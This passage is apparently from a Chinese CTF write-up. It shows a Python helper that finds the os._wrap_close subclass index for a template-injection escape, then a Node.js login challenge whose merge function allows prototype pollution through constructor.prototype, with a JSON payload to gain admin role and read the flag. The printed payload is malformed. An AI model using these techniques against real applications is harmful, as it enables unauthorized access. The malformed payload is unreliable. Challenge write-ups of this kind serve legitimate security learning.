class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文件中读取内容</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;类.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    a = file.read().strip()</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">allList = []</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result += i</span><br><span class="line">        allList.append(result)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;n&quot;</span> <span class="keyword">or</span> i == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(allList):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k) + <span class="string">&quot; &quot;</span> + <span class="string">&quot;---&gt;&quot;</span> + v)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>示例文本（由于篇幅问题没有全放）</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> &#x27;<span class="symbol">type</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">async_generator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">int</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">bytearray_iterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">bytearray</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">bytes_iterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">bytes</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">builtin_function_or_method</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">callable_iterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">PyCapsule</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">cell</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">classmethod_descriptor</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">classmethod</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">code</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">complex</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">coroutine</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">dict_items</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">dict_itemiterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">dict_keyiterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">dict_valueiterator</span>&#x27;&gt;</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>扫描目录发现有个&#x2F;src路由，访问可得源码</p><p>题目源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line"><span class="attr">secret</span>: crypto.<span class="title function_">randomBytes</span>(<span class="number">64</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line"><span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">saveUninitialized</span>: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line"><span class="keyword">var</span> users = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> admins = &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;<span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line"><span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line"><span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">target[key] = source[key]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkLogin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line"><span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[key]</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, checkLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>: req.<span class="property">session</span>.<span class="property">user</span>,</span><br><span class="line"><span class="string">&#x27;role&#x27;</span>: req.<span class="property">session</span>.<span class="property">role</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/login.html&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/src&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;app.js&#x27;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, checkLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="title function_">destroy</span>()</span><br><span class="line">res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, checkLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;This is your flag: &#x27;</span> + flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">let</span> msg = <span class="string">&#x27;Your role is not admin&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> &#123; username, password &#125; = <span class="title function_">merge</span>(&#123;&#125;, req.<span class="property">body</span>)</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> users === <span class="literal">false</span>)&#123;</span><br><span class="line">users[username] = password</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (password === users[username]) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">user</span> = username</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> admins) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login success&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login failed&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">5000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 5000&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>发现函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line"><span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line"><span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">target[key] = source[key]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确定是原型链污染</p><p>过滤了 <strong>proto</strong> ，可以用 constructor.prototype 来代替，分析源码可得当 req.session.role 是 admin 的时候，访问 &#x2F;flag 即可得到flag</p><p>看下login路由</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> &#123; username, password &#125; = <span class="title function_">merge</span>(&#123;&#125;, req.<span class="property">body</span>)</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> users === <span class="literal">false</span>)&#123;</span><br><span class="line">users[username] = password</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (password === users[username]) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">user</span> = username</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> admins) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login success&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login failed&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>只要我们的登录的用户名在admins字典中，访问&#x2F;flag就可以得到flag</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="string">&quot;constructor&quot;</span><span class="string">&quot;&#123;</span></span><br><span class="line"><span class="string">   &quot;</span>prototype<span class="string">&quot;:&#123;</span></span><br><span class="line"><span class="string">      &quot;</span>test<span class="string">&quot;: &quot;</span><span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829162203071.png" alt="image-20240829162203071"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SRCTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
